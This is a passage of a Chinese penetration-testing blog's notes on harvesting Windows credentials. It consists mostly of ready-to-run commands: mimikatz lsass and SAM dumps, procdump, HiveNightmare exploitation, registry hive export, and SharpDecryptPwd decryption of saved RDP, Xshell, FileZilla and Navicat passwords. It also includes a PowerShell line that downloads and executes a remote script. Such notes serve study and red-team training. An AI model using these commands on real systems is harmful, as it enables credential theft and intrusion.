+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">开启WDigest<br>reg <span class="hljs-keyword">add</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br><br>关闭WDigest<br>reg <span class="hljs-keyword">add</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="2、在线读取lsass-exe进程内存"><a href="#2、在线读取lsass-exe进程内存" class="headerlink" title="2、在线读取lsass.exe进程内存"></a>2、在线读取lsass.exe进程内存</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords full&quot;</span> <span class="hljs-keyword">exit</span><br><br><span class="hljs-comment">#从lsass.exe进程的内存中读取当前已登录用户的凭据(需要管理员身份执行,否则会DebugPrivilege权限获取失败)</span><br><span class="hljs-comment">#privilege::debug提升至DebugPrivilege权限</span><br><span class="hljs-comment">#sekurlsa::logonpasswords导出用户凭据</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="3、离线读取lsass-exe进程内存"><a href="#3、离线读取lsass-exe进程内存" class="headerlink" title="3、离线读取lsass.exe进程内存"></a>3、离线读取lsass.exe进程内存</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">procdump.exe -accepteula -ma lsass.exe lsass.dmp <br><span class="hljs-comment">#将lsass内存导出到lsass.dmp文件中</span><br><br>mimikatz.exe <span class="hljs-string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords full&quot;</span> <span class="hljs-keyword">exit</span> <br><span class="hljs-comment">#导入lsass.dmp内存文件并导出已登录用户凭据</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="4、在线读取本地Sam文件"><a href="#4、在线读取本地Sam文件" class="headerlink" title="4、在线读取本地Sam文件"></a>4、在线读取本地Sam文件</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;token::elevate&quot;</span> <span class="hljs-string">&quot;lsadump::sam&quot;</span> <span class="hljs-keyword">exit</span><br><span class="hljs-comment"># privilege::debug,用于提升至DebugPrivilege权限</span><br><span class="hljs-comment"># token::elevate,提升至system权限</span><br><span class="hljs-comment"># lsadump::sam,用于读取SAM文件</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="5、离线读取本地Sam文件"><a href="#5、离线读取本地Sam文件" class="headerlink" title="5、离线读取本地Sam文件"></a>5、离线读取本地Sam文件</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk">Invoke-NinjaCopy -Path <span class="hljs-string">&#x27;C:\Windows\System32\config\SAM&#x27;</span> -LocalDestination <span class="hljs-string">&#x27;C:\Users\h0cksr\Desktop\SAM&#x27;</span><br><span class="hljs-comment">#本地运行脚本获取</span><br><br>powershell.exe -exec bypass -Command <span class="hljs-string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.239.61:8001/Invoke-NinjaCopy.ps1&#x27;);Invoke-NinjaCopy -Path &#x27;C:\Windows\System32\config\SAM&#x27; -LocalDestination &#x27;C:\SAM&#x27;&quot;</span> <br><span class="hljs-comment">#远程下载脚本获取</span><br><br>icacls C:\Windows\System32\config\SAM    <span class="hljs-comment">#在一般用户权限下执行即可, 若是输出&quot;BUILTIN\Users:(I)(RX)&quot;则表示系统易受攻击COPY</span><br><span class="hljs-comment">#通过HiveNightmare漏洞(CVE-2021-36934)</span><br><br>python3 secretsdump.py -sam SAM-haxx -system SYSTEM-haxx -security SECURITY-haxx LOCALCOPY<br><span class="hljs-comment">#运行Impacket的secretsdump.py导出SAM文件中的哈希值</span><br><br>reg save HKEY_LOCAL_MACHINE\SAM\SAM sam.hive    <span class="hljs-comment">#导出SAM注册表</span><br>reg save HKEY_LOCAL_MACHINE\SYSTEM system.hive  <span class="hljs-comment">#导出SYSTEM注册表</span><br><span class="hljs-comment">#在管理员权限下通过保存注册表的方式导出</span><br><br>mimikatz.exe <span class="hljs-string">&quot;lsadump::sam /sam:sam.hive /system:system.hive&quot;</span> <span class="hljs-keyword">exit</span>  <br><span class="hljs-comment">#使用mimikatz读取SAM文件内容</span><br></code></pre></td></tr></table></figure>
+
+<h6 id="6、获取常见应用软件凭据"><a href="#6、获取常见应用软件凭据" class="headerlink" title="6、获取常见应用软件凭据"></a>6、获取常见应用软件凭据</h6><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 一、获取rdp保存的凭证</span><br>cmdkey /list <span class="hljs-comment">#查看当前保存的凭据</span><br>dir /a %USERPROFILE%\AppData\Local\Microsoft\Credentials\*   <span class="hljs-comment">#遍历Credentials目录下保存的历史连接凭据数据</span><br><br><span class="hljs-comment"># 使用Mimikatz导出RDP凭证</span><br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D&quot;</span> <span class="hljs-keyword">exit</span>    <span class="hljs-comment">#使用mimikatz解析指定的连接凭据</span><br><br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::dpapi&quot;</span> <span class="hljs-keyword">exit</span>   <span class="hljs-comment">#找到与guidMasterKey(GUID)相关联的MasterKey</span><br><br>mimikatz.exe <span class="hljs-string">&quot;dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D/masterkey:c33afd208e2f69c975b90546deedc8091c47eab49fb96a9c3092373f276a85dcf90d41e072eb4a105599244876b686c145f5bd2f00ffc12cac2e7faace661733&quot;</span> <span class="hljs-keyword">exit</span><br><br><span class="hljs-comment"># 二、Xshell凭证获取</span><br>SharpDecryptPwd.exe -Xmangager -p <span class="hljs-string">&quot;%USERPROFILE%\Documents\NetSarang\Xshell\Sessions&quot;</span>   <span class="hljs-comment">#获取Xshell5的账密</span><br>SharpDecryptPwd.exe -Xmangager -p <span class="hljs-string">&quot;%USERPROFILE%\Documents\NetSarang Computers\6\Xshell\Sessions&quot;</span>  <span class="hljs-comment">#获取Xshell6的账密COPY</span><br></code></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>Xshell版本</th>
+<th>.xsh文件路径</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Xshell5</td>
+<td>%USERPROFILE%\Documents\NetSarang\Xshell\Sessions</td>
+</tr>
+<tr>
+<td>Xshell6</td>
+<td>%USERPROFILE%\Documents\NetSarang Computers\6\Xshell\Sessions</td>
+</tr>
+<tr>
+<td>Xshell7</td>
+<td>%USERPROFILE%\Documents\NetSarang Computers\7\Xshell\Sessions</td>
+</tr>
+</tbody></table>
+<p>Xshell5和6可以通过工具<a target="_blank" rel="noopener" href="https://github.com/uknowsec/SharpDecryptPwd">SharpDecryptPwd</a>解密, 除此之外该工具还可以解密<code>Navicate</code>、<code>TeamViewer</code>、<code>FileZilla</code>、<code>WinSCP</code>、<code>Xmangager</code>系列产品</p>
+<p>将SharpDecryptPwd.exe上传到靶机, 执行命令即可获取xshell中保存的全部账号密码</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">SharpDecryptPwd<span class="hljs-selector-class">.exe</span> -Xmangager -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;%USERPROFILE%\Documents\NetSarang Computers\6\Xshell\Sessions&quot;</span>COPY<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># 三、FileZilla凭证获取</span><br><span class="hljs-keyword">SharpDecryptPwd.exe </span>-FileZillaCOPY<br></code></pre></td></tr></table></figure>
+
+<p>FileZilla用于FTP连接, 它会将FTP登录凭据以base64密文的格式保存在%USERPROFILE%\AppData\Roaming\FileZilla\recentservers.xml文件中, 可以使用SharpDecryptPwd直接一键导出FileZilla保存的凭据</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># 四、Navicat凭证获取</span><br><span class="hljs-keyword">SharpDecryptPwd.exe </span>-NavicatCryptoCOPY<br></code></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>数据库类型</th>
+<th>凭据存储路径(注册表)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Mysql</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Server&lt; Connetion Name&gt;</td>
+</tr>
+<tr>
+<td>MariaDB</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers&lt; Connetion Name&gt;</td>
+</tr>
+<tr>
+<td>MongoDB</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers&lt; Connetion Name&gt;</td>
+</tr>
+<tr>
+<td>SQL SERVER</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers&lt; Connetion Name&gt;</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers&lt; Connetion Name&gt;</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers&lt; Connetion Name&gt;</td>
+</tr>
+<tr>
+<td>SQLite</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers&lt; Connetion Name&gt;</td>
+</tr>
+</tbody></table>
+<p>Navicat的注册表中记录了保存密码的连接数据, 包括<code>IP,用户名,密码,连接数据库名,数据库类型</code>等, 其中密码字段是结果可你算法加密后再保存的, 其中Navicat&lt;&#x3D;11版本和Navicat&gt;&#x3D;12版本分别使用不同的加密算法(但是这就不需要我们关心了,直接工具一把梭拿到全部连接的账号密码和对应ip就行)</p>
+<h4 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h4><p><a target="_blank" rel="noopener" href="https://www.viewofthai.link/2022/10/17/%e3%80%8a%e5%86%85%e7%bd%91%e6%b8%97%e9%80%8f%e4%bd%93%e7%b3%bb%e5%bb%ba%e8%ae%be%e3%80%8b%e8%af%bb%e4%b9%a6%e7%ac%94%e8%ae%b0%ef%bc%88%e4%ba%8c%ef%bc%89/">https://www.viewofthai.link</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" class="category-chain-item">内网渗透笔记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Note/" class="print-no-link">#Note</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>内网信息收集笔记</div>
+      <div>https://sh1yan.top/2023/01/16/Intranet-information-collection-notes/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年1月16日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/11/30/Broker-htb-writeup/" title="Broker-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Broker-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/12/29/Vulnhub-Shooting-Record-Sickos1-Host/" title="vulnhub打靶记之Sickos1主机">
+                        <span class="hidden-mobile">vulnhub打靶记之Sickos1主机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
